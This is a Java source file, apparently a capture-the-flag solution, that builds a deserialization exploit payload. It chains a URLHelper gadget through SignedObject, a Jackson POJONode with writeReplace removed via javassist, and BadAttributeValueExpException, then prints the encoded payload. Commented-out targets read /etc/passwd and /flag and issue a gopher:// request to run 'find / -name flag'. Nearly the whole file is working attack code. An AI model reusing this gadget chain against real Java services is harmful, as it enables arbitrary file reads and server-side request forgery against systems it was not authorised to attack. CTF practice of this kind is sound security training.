package com.yancao.ctf;

import com.fasterxml.jackson.databind.node.POJONode;
import com.yancao.ctf.bean.URLHelper;
import com.yancao.ctf.bean.URLVisiter;
import com.yancao.ctf.util.MyObjectInputStream;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.*;
import java.util.Base64;

public class Exploit {
    public static void main(String[] args) throws Exception {
        /* 以下是生成 payload 的代码 */
//        URLHelper urlHelper = new URLHelper("FILE:///etc/passwd");
//        URLHelper urlHelper = new URLHelper("gopher://env.xj.edisec.net:32740/7/_find / -name flag");
//        URLHelper urlHelper = new URLHelper("http://localhost:8000/hola_test.txt");
//        URLHelper urlHelper = new URLHelper("FILE:///flag");
        URLHelper urlHelper = new URLHelper("FILE:///");
        URLVisiter urlVisiter = new URLVisiter();
        urlHelper.visiter = urlVisiter;

        //用于二次反序列化的类
        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        SignedObject signedObject = new SignedObject(urlHelper, privateKey, signingEngine);

        //删除 pojoNode 的 writeReplace
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass jsonNode = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = jsonNode.getDeclaredMethod("writeReplace");
            jsonNode.removeMethod(writeReplace);
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            jsonNode.toClass(classLoader, null);
        } catch (Exception e) {
        }

        POJONode pojoNode = new POJONode(signedObject);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Class cls = Class.forName("javax.management.BadAttributeValueExpException");
        Field val = cls.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, pojoNode);

        //序列化
        ByteArrayOutputStream ser = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(ser);
        objectOutputStream.writeObject(badAttributeValueExpException);
        String payload = Base64.getEncoder().encodeToString(ser.toByteArray());

        payload = URLEncoder.encode(payload, StandardCharsets.UTF_8.toString());
        System.out.println(payload);



        /* 以下是反序列化漏洞的解析代码 */
        byte[] bytes = Base64.getDecoder().decode(payload.getBytes(StandardCharsets.UTF_8));
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        try {
            MyObjectInputStream myObjectInputStream = new MyObjectInputStream(byteArrayInputStream);
            Object obj = myObjectInputStream.readObject();
            URLHelper o = (URLHelper)obj;
            System.out.println(o);
            System.out.println(o.url);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
